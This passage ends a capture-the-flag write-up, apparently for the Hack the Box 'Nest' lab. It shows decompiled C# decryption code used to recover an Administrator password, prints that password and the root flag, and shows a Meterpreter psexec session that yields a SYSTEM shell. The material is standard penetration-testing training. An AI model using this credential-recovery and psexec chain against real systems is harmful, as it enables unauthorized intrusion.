            <span class="kt">byte</span><span class="p">[]</span> <span class="n">bytes3</span> <span class="p">=</span> <span class="n">rfc2898DeriveBytes</span><span class="p">.</span><span class="nf">GetBytes</span><span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="n">Math</span><span class="p">.</span><span class="nf">Round</span><span class="p">((</span><span class="kt">double</span><span class="p">)</span><span class="n">keySize</span> <span class="p">/</span> <span class="m">8.0</span><span class="p">));</span>
            <span class="n">AesCryptoServiceProvider</span> <span class="n">aesCryptoServiceProvider</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">AesCryptoServiceProvider</span><span class="p">();</span>
            <span class="n">aesCryptoServiceProvider</span><span class="p">.</span><span class="n">Mode</span> <span class="p">=</span> <span class="n">CipherMode</span><span class="p">.</span><span class="n">CBC</span><span class="p">;</span>
            <span class="n">ICryptoTransform</span> <span class="n">transform</span> <span class="p">=</span> <span class="n">aesCryptoServiceProvider</span><span class="p">.</span><span class="nf">CreateDecryptor</span><span class="p">(</span><span class="n">bytes3</span><span class="p">,</span> <span class="n">bytes</span><span class="p">);</span>
            <span class="n">MemoryStream</span> <span class="n">memoryStream</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">MemoryStream</span><span class="p">(</span><span class="n">array</span><span class="p">);</span>
            <span class="n">CryptoStream</span> <span class="n">cryptoStream</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">CryptoStream</span><span class="p">(</span><span class="n">memoryStream</span><span class="p">,</span> <span class="n">transform</span><span class="p">,</span> <span class="n">CryptoStreamMode</span><span class="p">.</span><span class="n">Read</span><span class="p">);</span>
            <span class="kt">byte</span><span class="p">[]</span> <span class="n">array2</span> <span class="p">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="p">[</span><span class="n">array</span><span class="p">.</span><span class="n">Length</span> <span class="p">+</span> <span class="m">1</span><span class="p">];</span>
            <span class="kt">int</span> <span class="n">count</span> <span class="p">=</span> <span class="n">cryptoStream</span><span class="p">.</span><span class="nf">Read</span><span class="p">(</span><span class="n">array2</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="n">array2</span><span class="p">.</span><span class="n">Length</span><span class="p">);</span>
            <span class="n">memoryStream</span><span class="p">.</span><span class="nf">Close</span><span class="p">();</span>
            <span class="n">cryptoStream</span><span class="p">.</span><span class="nf">Close</span><span class="p">();</span>
            <span class="k">return</span> <span class="n">Encoding</span><span class="p">.</span><span class="n">ASCII</span><span class="p">.</span><span class="nf">GetString</span><span class="p">(</span><span class="n">array2</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="n">count</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></table></code></div></div><p>After cleaning up the code a bit, I once again copied it over to .NET Fiddle, this time selecting C# as the language.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/user_Administrator_C#_decrypt.png" alt="" /></p><p>After clicking <code class="language-plaintext highlighter-rouge">&gt; Run</code> the function provided me with the Administrator password <code class="language-plaintext highlighter-rouge">XtH4nkS4Pl4y1nGX</code></p><h3 id="roottxt">Root.txt</h3><p>Once I had the Administrator password, it was simple to find the root flag. It was in the <code class="language-plaintext highlighter-rouge">Administrator\Desktop\</code> folder in the <code class="language-plaintext highlighter-rouge">Users</code> share.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>zweilos@kalimaa:~/htb/nest$ cat 'Administrator\Desktop\root.txt' 
2f1fbb443419c664fff8b0f0424a3da1
</pre></table></code></div></div><h3 id="getting-a-shell">Getting a shell</h3><p>After getting the root flag, I also went back to see if I could actually get a shell on the box to try to elevate to System privileges since this entire box had been completed in locked down quasi-shells the whole time. I used the <code class="language-plaintext highlighter-rouge">psexec</code> module through Meterpreter with the Administrator credentials, and it returned a System shell right away.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>meterpreter &gt; shell
Process 1732 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32&gt;whoami
whoami
nt authority\system

C:\Windows\system32&gt;
</pre></table></code></div></div><p>Thanks to <a href="https://www.hackthebox.eu/home/users/profile/158833"><code class="language-plaintext highlighter-rouge">Vbscrub</code></a> for creating such a unique and interesting challenge! I certainly learned a few useful new tricks, and learned to always check back in places where you may have already been upon gaining new levels of access.</p><p>If you have comments, issues, or other feedback, or have any other fun or useful tips or tricks to share, feel free to contact me on Github at <a href="https://github.com/zweilosec">https://github.com/zweilosec</a> or in the comments below!</p><p>If you like this content and would like to see more, please consider buying me a coffee! <a href="https://www.buymeacoffee.com/zweilosec"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://img.buymeacoffee.com/button-api/?text=Buy me a coffee&amp;emoji=&amp;slug=zweilosec&amp;button_colour=FFDD00&amp;font_colour=000000&amp;font_family=Lato&amp;outline_colour=000000&amp;coffee_colour=ffffff" /></a></p></div><script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="zweilosec" data-description="Support me on Buy me a coffee!" data-message="If you like this content and would like to see more, please consider buying me a coffee!" data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18"></script><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hack-the-box/'>Hack the Box</a>, <a href='/categories/writeup/'>Writeup</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/htb/" class="post-tag no-text-decoration" >htb</a> <a href="/tags/hacking/" class="post-tag no-text-decoration" >hacking</a> <a href="/tags/hack-the-box/" class="post-tag no-text-decoration" >hack the box</a> <a href="/tags/redteam/" class="post-tag no-text-decoration" >redteam</a> <a href="/tags/windows/" class="post-tag no-text-decoration" >windows</a> <a href="/tags/ads/" class="post-tag no-text-decoration" >ads</a> <a href="/tags/smb/" class="post-tag no-text-decoration" >smb</a> <a href="/tags/vb/" class="post-tag no-text-decoration" >vb</a> <a href="/tags/net/" class="post-tag no-text-decoration" >.net</a> <a href="/tags/binary-analysis/" class="post-tag no-text-decoration" >binary analysis</a> <a href="/tags/ilspy/" class="post-tag no-text-decoration" >ilspy</a> <a href="/tags/oscp/" class="post-tag no-text-decoration" >oscp</a> <a href="/tags/tj-null/" class="post-tag no-text-decoration" >tj_null</a> <a href="/tags/medium/" class="post-tag no-text-decoration" >medium</a> <a href="/tags/writeup/" class="post-tag no-text-decoration" >writeup</a> <a href="/tags/vbscrub/" class="post-tag no-text-decoration" >vbscrub</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hack the Box - Nest Writeup - Hacker's Rest&url=https://zweilosec.github.io/posts/nest/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hack the Box - Nest Writeup - Hacker's Rest&u=https://zweilosec.github.io/posts/nest/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Hack the Box - Nest Writeup - Hacker's Rest&url=https://zweilosec.github.io/posts/nest/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/upgrade-linux-shell/">Upgrade a linux reverse shell to a fully usable TTY shell</a><li><a href="/posts/late/">Hack The Box - Late Writeup</a><li><a href="/posts/acute/">Hack The Box - Acute Writeup</a><li><a href="/posts/jekyll-chirpy-github-pages-blog/">How to use GitHub Pages to host a blog with Jekyll Chirpy theme</a><li><a href="/posts/zip-unzip-files-powershell/">How to Zip and Unzip Files Using PowerShell</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/hacking/">hacking</a> <a class="post-tag" href="/tags/hack-the-box/">hack the box</a> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/redteam/">redteam</a> <a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/unfinished/">unfinished</a> <a class="post-tag" href="/tags/oscp/">oscp</a> <a class="post-tag" href="/tags/tj-null/">tj_null</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <script src="https://utteranc.es/client.js" repo="zweilosec/zweilosec.github.io" issue-term="title" label="comments 💬" theme="github-dark" crossorigin="anonymous" async> </script><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/sharp/"><div class="card-body"> <span class="timeago small" > May 1, 2021 <i class="unloaded">2021-05-01T14:00:00+00:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack the Box - Sharp Writeup</h3><div class="text-muted small"><p> HTB - Sharp Overview This hard-difficulty Windows machine from Hack the Box was both challenging and fun. As the name suggests, it focuses on a few user-made code projects that use the C Sharp...</p></div></div></a></div><div class="card"> <a href="/posts/resolute/"><div class="card-body"> <span class="timeago small" > May 24, 2020 <i class="unloaded">2020-05-24T14:00:00+00:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack the Box - Resolute Writeup</h3><div class="text-muted small"><p> HTB - Resolute Overview A medium-difficulty Windows box that was fairly straightforward. Privilege escalation required going through two different users and taking advantage of Windows domain ...</p></div></div></a></div><div class="card"> <a href="/posts/monteverde/"><div class="card-body"> <span class="timeago small" > May 30, 2020 <i class="unloaded">2020-05-30T14:00:00+00:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack the Box - Monteverde Writeup</h3><div class="text-muted small"><p> HTB - Monteverde Overview Short description to include any strange things to be dealt with…when there is a proper description here the website build will stop breaking. Hopefully this is enough...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/monteverde/" class="btn btn-outline-primary" prompt="Older"><p>Hack the Box - Monteverde Writeup</p></a> <a href="/posts/sauna/" class="btn btn-outline-primary" prompt="Newer"><p>Hack the Box - Sauna Writeup</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/zweilosec">zweilosec</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/hacking/">hacking</a> <a class="post-tag" href="/tags/hack-the-box/">hack the box</a> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/redteam/">redteam</a> <a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/unfinished/">unfinished</a> <a class="post-tag" href="/tags/oscp/">oscp</a> <a class="post-tag" href="/tags/tj-null/">tj_null</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://zweilosec.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
